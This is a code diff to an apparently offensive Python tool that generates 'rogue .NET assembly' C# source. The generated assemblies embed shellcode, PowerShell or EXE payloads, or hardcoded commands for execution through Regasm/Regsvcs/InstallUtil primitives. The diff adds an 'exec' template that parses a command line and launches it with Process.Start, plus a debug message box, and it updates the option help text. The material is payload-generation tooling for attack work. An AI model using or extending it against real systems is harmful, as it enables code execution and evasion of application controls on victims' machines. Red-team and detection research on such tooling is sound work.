@@ -55,7 +55,7 @@ import subprocess
 COMPILER_BASE = r'%WINDIR%\\Microsoft.NET\\Framework<ARCH>\\<VER>\\csc.exe'
 
 TYPES_NOT_NEEDING_INPUT_FILE = (
-  'run-command'
+  'run-command', 'exec'
 )
 
 COMPILERS = {
@@ -586,7 +586,50 @@ def getSourceFileContents(
       launchCode = '''
 
       public static bool Execute() {
-          Process.Start(Environment.ExpandEnvironmentVariables(@"<CMD>"));
+          string fullPath = @"<CMD>";
+          ProcessStartInfo psi = new ProcessStartInfo();
+          psi.FileName = Path.GetFileName(fullPath);
+          psi.WorkingDirectory = Path.GetDirectoryName(fullPath);
+
+          string args = "";
+          if(fullPath[0] == '"')
+          {
+              int pos = fullPath.IndexOf("\\"", 1);
+              if(pos != -1)
+              {
+                  psi.FileName = Path.GetFileName(fullPath.Substring(1, pos));
+                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1, pos));
+
+                  if (pos + 2 < fullPath.Length && fullPath[pos + 2] == ' ') 
+                  {
+                      args = fullPath.Substring(pos + 2);
+                  }
+              }
+              else
+              {
+                  psi.FileName = Path.GetFileName(fullPath.Substring(1));
+                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1));
+              }
+          }
+          else 
+          {
+              int pos = fullPath.IndexOf(" ");
+              if (pos != -1)
+              {
+                  psi.FileName = Path.GetFileName(fullPath.Substring(0, pos));
+                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(0, pos));
+
+                  if (pos + 1 < fullPath.Length)
+                  {
+                      args = fullPath.Substring(pos + 1);
+                  }
+              }
+          }
+
+          MessageBox.Show("filename: (" + psi.FileName + "), cwd: (" + psi.WorkingDirectory + "), args: (" + args + ")");
+          psi.Arguments = args;
+          Process.Start(psi);
+
           return true;
       }
 
@@ -613,6 +656,7 @@ def getSourceFileContents(
 
 $assemblyAdditions1
 
+using System.Windows.Forms;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using Microsoft.Build.Framework;
@@ -678,7 +722,7 @@ def opts(argv):
     parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <inputFile|cmdline>')
     parser.add_argument('inputFile', help = 'Input file to embedded into C# source code for --type regasm|plain. If --type exec was given, this parameter specifies command line to execute by the resulting assembly (environment variables will get expanded). May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.')
 
-    parser.add_argument('-t', '--type', choices=['regasm', 'plain', 'exec', 'run-command'], help = 'Specifies type of source code template to choose from while generating rogue .NET assembly. "regasm" - generates a template compatible with Regasm/Regsvcs/InstallUtil code execution primitives, "plain" - just a simple plain assembly with embedded shellcode/ps1/exe, "exec" - a simple shell command execution assembly which takes a command specified in "inputFile|cmdline" required parameter, "run-command" exposes a method named --method which takes one string parameter being a command to run. Default: regasm')
+    parser.add_argument('-t', '--type', choices=['regasm', 'plain', 'exec', 'run-command'], help = 'Specifies type of source code template to choose from while generating rogue .NET assembly. "regasm" - generates a template compatible with Regasm/Regsvcs/InstallUtil code execution primitives, "plain" - just a simple plain assembly with embedded shellcode/ps1/exe, "exec" - a simple shell command execution assembly which takes a command specified in "inputFile|cmdline" required parameter and embeds it hardcoded into the code, "run-command" exposes a method named --method which takes one string parameter being a command to run. Default: regasm')
     parser.add_argument('-c', '--compile', choices=['nocompile', 'x86', 'x64'], default='nocompile', help = 'Compile the source code using x86 or x64 csc.exe and generate output EXE/DLL file depending on --output extension. Default: nocompile - meaning the script will only produce .cs source code rather than compiled binary file.')
     parser.add_argument('-o', '--output', metavar='PATH', default='', type=str, help = 'Output path where to write generated script. Default: stdout')
     parser.add_argument('-s', '--namespace', metavar='NAME', default='ProgramNamespace', type=str, help = 'Specifies custom C# module namespace for the generated Task (for needs of shellcode loaders such as DotNetToJScript or Donut). Default: ProgramNamespace.')
@@ -722,7 +766,7 @@ def main(argv):
         sys.stderr.write('[?] Input file does not exists.\n\n')
         return False
 
-    if args.type not in ['exec', 'run-command']:
+    if args.type not in TYPES_NOT_NEEDING_INPUT_FILE:
       if args.exe:
           if not detectFileIsExe(args.inputFile, args.exe):
               sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')
